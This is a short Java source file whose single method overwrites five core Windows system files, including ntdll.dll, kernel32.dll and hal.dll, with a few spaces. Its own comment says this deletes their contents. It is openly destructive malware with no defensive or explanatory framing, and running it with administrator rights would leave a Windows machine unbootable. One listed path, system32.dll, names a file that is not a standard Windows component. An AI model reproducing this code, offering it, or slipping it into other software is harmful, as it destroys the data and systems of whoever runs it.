package ml.lucid.corruption;

import java.io.PrintWriter;

public class corruption {
    //deletes the contents of these files
    static String ntdll = "C:\\Windows\\System32\\ntdll.dll";
    static String user32 = "C:\\Windows\\System32\\user32.dll";
    static String sys32 = "C:\\Windows\\System32\\system32.dll";
    static String hal = "C:\\Windows\\System32\\hal.dll";
    static String kernel = "C:\\Windows\\System32\\kernel32.dll";

    public static void corrupt() {
        try {
            PrintWriter ntdllw = new PrintWriter(ntdll);
            PrintWriter user32w = new PrintWriter(user32);
            PrintWriter sys32w = new PrintWriter(sys32);
            PrintWriter halw = new PrintWriter(hal);
            PrintWriter kernelw = new PrintWriter(kernel);
            for (int i = 0; i < 5; i++) {
                ntdllw.write(" ");
                user32w.write(" ");
                sys32w.write(" ");
                halw.write(" ");
                kernelw.write(" ");
            }
            ntdllw.close();
            user32w.close();
            sys32w.close();
            halw.close();
            kernelw.close();
        }catch(Exception e){
            System.out.println("Not enough Perms.");
        }
    }
}

